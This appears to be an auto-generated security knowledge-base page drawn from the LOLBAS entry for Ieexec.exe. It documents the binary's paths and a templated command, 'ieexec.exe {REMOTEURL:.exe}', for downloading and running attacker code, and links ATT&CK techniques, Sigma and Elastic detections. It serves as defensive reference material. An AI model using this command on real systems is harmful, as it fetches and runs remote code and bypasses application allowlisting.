---
title: "Ieexec.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Ieexec.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ieexec.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Ieexec.exe"
functions:
  - "Download"
  - "Execute"
attack_technique_ids:
  - "T1105"
  - "T1218"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Ieexec.exe

The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Ieexec.yml

## Paths

- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe`

## Commands

### 1. Download

Downloads and executes executable from the remote server.

```cmd
ieexec.exe {REMOTEURL:.exe}
```

- Use Case: Download and run attacker code from remote location
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

### 2. Execute

Downloads and executes executable from the remote server.

```cmd
ieexec.exe {REMOTEURL:.exe}
```

- Use Case: Download and run attacker code from remote location
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- IOC: Network connections originating from ieexec.exe may be suspicious

## Resources

- {'Link': 'https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/'}

## Acknowledgements

- {'Person': 'Casey Smith', 'Handle': '@subtee'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ieexec.yml)
